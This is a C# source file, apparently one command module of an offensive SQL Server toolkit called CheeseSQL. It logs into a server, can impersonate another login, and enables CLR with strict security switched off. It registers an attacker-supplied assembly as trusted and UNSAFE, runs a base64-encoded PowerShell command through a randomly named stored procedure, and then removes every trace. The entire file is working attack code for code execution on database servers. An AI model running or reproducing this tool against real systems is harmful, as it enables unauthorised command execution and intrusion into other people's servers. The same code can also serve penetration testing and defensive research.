using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;

namespace CheeseSQL.Commands
{
    public class clr : ICommand
    {
        public static string CommandName => "clr";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command via custom CLR assembly";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/command:COMMAND " +
                $"/assembly:DLL " +
                $"/class:CLASS " +
                $"/method:METHOD " +
                $"[/compile] " +
                $"[/impersonate:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string database = "";
            string connectserver = "";
            string assembly = "";
            string clazz = "";
            string cmd = "";
            string method = "";
            string connectInfo = "";
            string impersonate = "";
            bool compile = false;

            bool sqlauth = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/compile"))
            {
                compile = true;
            }
            if (arguments.ContainsKey("/assembly"))
            {
                assembly = arguments["/assembly"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }
            if (arguments.ContainsKey("/class"))
            {
                clazz = arguments["/class"];
            }
            if (arguments.ContainsKey("/method"))
            {
                method = arguments["/method"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = arguments["/impersonate"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(assembly) && !compile)
            {
                Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                return;
            }
            else if (String.IsNullOrEmpty(assembly) && compile)
            {
                assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute (PS Base64 Encoded)!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(clazz))
            {
                clazz = "StoredProcedures";
            }
            if (String.IsNullOrEmpty(method))
            {
                method = StringUtils.RandomString(10);
            }

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            Console.WriteLine("[*] Loading assembly..");

            string hash;
            string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);

            var procedures = new Dictionary<string, string>();

            if (!String.IsNullOrEmpty(impersonate))
            {
                procedures.Add($"Attempting impersonation as {impersonate}..", $"EXECUTE AS LOGIN = '{impersonate}';");
            }

            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr strict security'..", $"sp_configure 'clr strict security', 0; RECONFIGURE;");
            procedures.Add("Adding assembly to trusted list..", $"sp_add_trusted_assembly @hash={hash};");
            procedures.Add($"Creating assembly [{assembly}]..", $"CREATE ASSEMBLY [{assembly}] FROM {hexData} WITH PERMISSION_SET = UNSAFE;");
            procedures.Add($"Creating procedure [{assembly}].[{clazz}].[{method}]..", $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];");

            procedures.Add("Executing command..", $"{method} '{cmd}';");

            procedures.Add("Dropping procedure..", $"DROP PROCEDURE [dbo].[{method}];");
            procedures.Add("Dropping assembly..", $"DROP ASSEMBLY [{assembly}];");
            procedures.Add("Removing assembly from trusted list..", $"sp_drop_trusted_assembly @hash={hash};");
            procedures.Add("Restoring CLR strict security'..", $"sp_configure 'clr strict security', 1; RECONFIGURE;");
            procedures.Add("Disabling CLR..", $"sp_configure 'clr enabled', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);
                SQLExecutor.ExecuteProcedure(connection, procedures[step]);
            }

            connection.Close();
        }
    }
}
